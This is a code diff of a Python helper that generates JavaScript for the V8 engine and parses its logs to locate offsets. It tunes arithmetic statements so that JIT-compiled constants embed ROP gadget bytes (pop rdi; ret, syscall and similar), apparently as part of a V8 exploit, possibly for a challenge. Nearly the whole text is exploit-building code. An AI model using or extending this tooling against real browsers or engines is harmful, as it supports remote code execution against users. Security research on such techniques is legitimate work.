@@ -5,7 +5,7 @@ import random
 import time
 import os
 
-gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
+gadgets = ['c358', 'c35f', 'c35f', 'c35f', '050f']
 exec_path = ''
 
 
@@ -21,7 +21,7 @@ def get_offset(log: str) -> List[int]:
     lines = f.readlines()
     res = []
     for line in lines:
-        if line.find('rip+') != -1 and line.find('movq r10') != -1:
+        if line.find('rip+') != -1 and line.find('movq ') != -1:
             res.append(int(line[line.find('+0x') + 7:-2], 16))
 
     return res
@@ -49,12 +49,17 @@ def generate_jsc(count1: int, count2) -> str:
     global header
     global tail
 
+    # 0x24
     jsc = ''
     for i in range(count1):
+        jsc += '\tv1 += 0x' + '%x' % ((i) % 0x80) + ';\n'
         jsc += '\tv1 ^= 0x' + '%x' % ((i) % 0x80) + ';\n'
 
+    # 0x4B
     for i in range(count2):
-        jsc += '\tv1 ^= 0x' + '%x' % ((0x80 + i) % 0x10000) + ';\n'
+        jsc += '\tv1 *= 0x' + '%x' % ((0x81 + i) % 0x10000) + ';\n'
+        jsc += '\tv1 -= 0x' + '%x' % ((0x81 + i) % 0x10000) + ';\n'
+        jsc += '\tv1 &=  0xff;\n'
 
     return header + jsc + tail
 
@@ -70,23 +75,52 @@ if __name__ == '__main__':
         print('path of v8 error')
         exit()
 
-    template = generate_jsc(0, 1)
-    excute_js(template, 'test')
+    template1 = generate_jsc(0x20, 0x20)
+    excute_js(template1, 'test')
     offsets = get_offset('test.txt')
     unique_set = set(offsets)
-    print(["%x"%i for i in offsets])
-    for i in range(2, 0x7f):
-        jsc = generate_jsc(i, 0)
-        excute_js(jsc, 'test')
-        tmp_offsets = get_offset('test.txt')
-        rel_offsets = [i for i in tmp_offsets if i not in unique_set]
-        print(i, ['%x' % i for i in rel_offsets])
-        unique_set |= set(tmp_offsets)
+    template2 = generate_jsc(0x20, 0x21)
+    excute_js(template2, 'test')
+    offsets = get_offset('test.txt')
+    unique_set |= set(offsets)
+    # print(["%x"%i for i in unique_set])s
+    base_js = generate_jsc(0x20, 0x22)
+    excute_js(base_js, 'test')
+    offsets = get_offset('test.txt')
+    bases = [i for i in offsets if i not in unique_set]
+    print(bases)
+    gad_map = {}
+    for gadget in gadgets:
+        for base in bases:
+            if (base - int(gadget, 16)) % 3 == 0:
+                d1 = (base - int(gadget, 16)) // 3
+                d2 = d1 * -2
+                old2 = d2
+                d2 %= 25
+                d1 += (d2 - old2) * 12 // 25
+                gad_map[gadget] = [d2, d1]
 
-    # jsc = generate_jsc(102, 0)
+    print(gad_map) 
+    for k in gad_map.keys():
+        v = gad_map[k]
+        print(v)
+        js = generate_jsc(0x20 + v[0], 0x22 + v[1])
+        excute_js(js, k)
+        offsets =  get_offset(k + '.txt')
+        rel_offsets = [i for i in offsets if i not in unique_set]
+        print(rel_offsets)
+
+    # for i in range(0x22, 0xff):
+    #     jsc = generate_jsc(0x20, i)
+    #     excute_js(jsc, 'test')
+    #     tmp_offsets = get_offset('test.txt')
+    #     rel_offsets = [i for i in tmp_offsets if i not in unique_set]
+    #     print(i, ['%x' % i for i in rel_offsets])
+    #     unique_set |= set(tmp_offsets)
+
+    # jsc = generate_jsc(0, 50)
     # excute_js(jsc, 'test')
         
-    # gad_map = {}
     # for gadget in gadgets:
     #     dd = 4
     #     dbase = 0
